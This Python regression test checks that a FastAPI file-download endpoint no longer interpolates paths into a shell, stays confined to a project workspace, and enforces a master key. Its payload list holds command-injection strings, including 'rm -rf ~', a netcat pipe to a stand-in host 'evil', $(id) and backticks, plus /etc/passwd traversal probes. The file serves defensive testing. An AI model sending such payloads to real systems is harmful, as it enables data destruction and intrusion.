"""
Regression + unit tests for the /files download endpoint (agentic/api.py).

Closes the unauthenticated OS command-injection (CWE-78) in `download_file`:
the endpoint used to read a file INSIDE kali-sandbox via the `kali_shell` MCP
tool, which runs the command through `bash -c`, with the untrusted `path`
interpolated into that shell string (`/tmp/x; id` ran a second command).

Since the 4.9 review (finding 6) the endpoint reads the file from the project's
workspace bind mount through the checked descriptor (open_download_for_project),
so no shell is involved at all, and only the named project's workspace is
served: /tmp and every other path is refused. The route also carries the master
key dependency (`Depends(require_configured_master_auth)`, step 1.9; the webapp
is its one caller, NF-01). The workspace confinement itself is
tests/test_download_card_workspace.py.

Needs fastapi + the agent runtime (imports api.py), so it runs in the agent
container, not on a bare host:
    docker compose exec agent python3 tests/test_files_injection.py

It skips gracefully (exit 0) if fastapi is unavailable, so it is safe to run
anywhere.
"""

import asyncio
import os
import shutil
import sys
import tempfile
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # agentic/

results = []

PROJECT = "p-inject"


def check(name, cond):
    results.append((name, bool(cond)))
    print(f"  [{'PASS' if cond else 'FAIL'}] {name}")


class _FakeToolExecutor:
    """Records every tool call: a download must make none."""

    def __init__(self):
        self.commands = []

    async def execute(self, tool_name, tool_args, phase, skip_phase_check=False):
        self.commands.append((tool_name, tool_args.get("command", "")))
        return {"success": True, "output": ""}


class _FakeOrchestrator:
    def __init__(self):
        self.tool_executor = _FakeToolExecutor()


def _call(api, path, project_id=PROJECT):
    """Invoke the route coroutine directly (bypasses FastAPI dep-injection, so
    it exercises the handler body regardless of the auth dependency)."""
    return asyncio.run(api.download_file(projectId=project_id, path=path))


def _body(resp) -> bytes:
    """The bytes of a direct handler call: a plain Response or a stream."""
    if hasattr(resp, "body_iterator"):
        async def read():
            return b"".join([chunk async for chunk in resp.body_iterator])
        data = asyncio.run(read())
        if resp.background is not None:
            asyncio.run(resp.background())
        return data
    return getattr(resp, "body", b"")


# Payloads that used to need shell quoting. Each is a path inside the project's
# workspace now: none may reach a shell, and none names an existing file.
INJECTION_PAYLOADS = [
    ("notes/x; touch /tmp/PWNED", "semicolon"),
    ("notes/x && rm -rf ~", "and-rm"),
    ("notes/x | nc evil 1", "pipe"),
    ("notes/$(id)", "dollar-paren"),
    ("notes/`id`", "backtick"),
    ("notes/x\nid", "newline"),
    ("notes/x > out", "redirect"),
    ("notes/x${IFS}id", "ifs-brace"),
]


def main():
    try:
        import api  # noqa: E402  (needs fastapi + agent deps)
        import llm_guard  # noqa: E402
        import workspace_fs  # noqa: E402
    except Exception as exc:
        print(f"SKIP: cannot import api ({exc}); run inside the agent container")
        return 0

    fake = _FakeOrchestrator()
    api.orchestrator = fake
    tmp = Path(tempfile.mkdtemp(prefix="files-inject-"))
    root_patch = mock.patch.object(workspace_fs, "WORKSPACE_ROOT", tmp)
    root_patch.start()
    try:
        root = workspace_fs.resolve_for_project(PROJECT, ".")
        (root / "notes" / "report.pdf").write_bytes(b"hello")
        (root / "notes" / "my report (1).pdf").write_bytes(b"hello")
        (root / "notes" / "a'b.txt").write_bytes(b"hello")

        # ---- 1. No payload reaches a shell: the handler makes no tool call at all ----
        for payload, label in INJECTION_PAYLOADS:
            fake.tool_executor.commands.clear()
            resp = _call(api, payload)
            check(f"no shell, nothing served ({label})",
                  not fake.tool_executor.commands and getattr(resp, "status_code", None) in (403, 404))

        # ---- 2. A file of the project's workspace downloads, by absolute or relative path ----
        resp = _call(api, f"/workspace/{PROJECT}/notes/report.pdf")
        check("benign: an absolute workspace path returns the bytes (200)",
              getattr(resp, "status_code", None) == 200 and _body(resp) == b"hello")
        resp = _call(api, "notes/report.pdf")
        check("benign: a workspace-relative path returns the bytes (200)",
              getattr(resp, "status_code", None) == 200 and _body(resp) == b"hello")

        # ---- 3. Legit filenames that once needed quoting still download ----
        for name in ("my report (1).pdf", "a'b.txt"):
            resp = _call(api, f"/workspace/{PROJECT}/notes/{name}")
            check(f"quoting-era filename downloads ({name})",
                  getattr(resp, "status_code", None) == 200 and _body(resp) == b"hello")
        check("benign: no tool call for any download", not fake.tool_executor.commands)

        # ---- 4. Paths outside the project's workspace are forbidden ----
        for path, label in (("/etc/passwd", "absolute elsewhere"), ("/tmp/report.pdf", "the sandbox /tmp"),
                            ("/tmp/../etc/passwd", "/tmp traversal"),
                            (f"/workspace/{PROJECT}/../other/a.txt", "workspace traversal")):
            check(f"guard: {label} is forbidden (403)", getattr(_call(api, path), "status_code", None) == 403)
        check("guard: no projectId is refused (400)",
              getattr(_call(api, "notes/report.pdf", project_id=""), "status_code", None) == 400)

        # ---- 5. The route carries the master-key dependency (declared; NF-01, step 1.9) ----
        files_route = next(
            (r for r in api.app.routes if getattr(r, "path", None) == "/files"), None
        )
        dep_calls = []
        if files_route is not None and getattr(files_route, "dependant", None) is not None:
            dep_calls = [d.call for d in files_route.dependant.dependencies]
        check(
            "auth: /files declares Depends(require_configured_master_auth)",
            llm_guard.require_configured_master_auth in dep_calls,
        )
        check(
            "auth: /files no longer takes the scanner key (require_internal_auth_only)",
            llm_guard.require_internal_auth_only not in dep_calls,
        )

        # ---- 6. The dependency actually ENFORCES via a real request (TestClient).
        #         Sets INTERNAL_API_KEY so llm_guard is fail-CLOSED, then checks
        #         missing/wrong/correct key. ----
        try:
            from fastapi.testclient import TestClient

            prev_key = os.environ.get("INTERNAL_API_KEY")
            os.environ["INTERNAL_API_KEY"] = "unit-test-key"
            client = TestClient(api.app)  # no `with`: does not run lifespan
            params = {"projectId": PROJECT, "path": "notes/report.pdf"}

            r_nokey = client.get("/files", params=params)
            check("auth(enforce): no key -> 401", r_nokey.status_code == 401)

            r_badkey = client.get("/files", params=params, headers={"x-internal-key": "wrong"})
            check("auth(enforce): wrong key -> 401", r_badkey.status_code == 401)

            r_okkey = client.get("/files", params=params, headers={"x-internal-key": "unit-test-key"})
            check(
                "auth(enforce): correct key -> the file (200)",
                r_okkey.status_code == 200 and r_okkey.content == b"hello",
            )
            # and injection is still inert through the full request path:
            fake.tool_executor.commands.clear()
            r_inject = client.get(
                "/files", params={"projectId": PROJECT, "path": "notes/x; touch /tmp/PWNED"},
                headers={"x-internal-key": "unit-test-key"},
            )
            check("auth(enforce): injection inert through full HTTP path",
                  r_inject.status_code == 404 and not fake.tool_executor.commands)

            if prev_key is None:
                os.environ.pop("INTERNAL_API_KEY", None)
            else:
                os.environ["INTERNAL_API_KEY"] = prev_key
        except Exception as exc:
            print(f"  [SKIP] TestClient auth-enforcement checks unavailable ({exc})")
    finally:
        root_patch.stop()
        shutil.rmtree(tmp, ignore_errors=True)

    # ---- Summary ----
    passed = sum(1 for _, ok in results if ok)
    total = len(results)
    print(f"\n{passed}/{total} checks passed")
    return 0 if passed == total else 1


def test_files_injection():
    """pytest entrypoint: run the script-style checks; main() returns
    non-zero on any failed check (bucket-1 runner-compat conversion)."""
    assert main() == 0


if __name__ == "__main__":
    sys.exit(main())
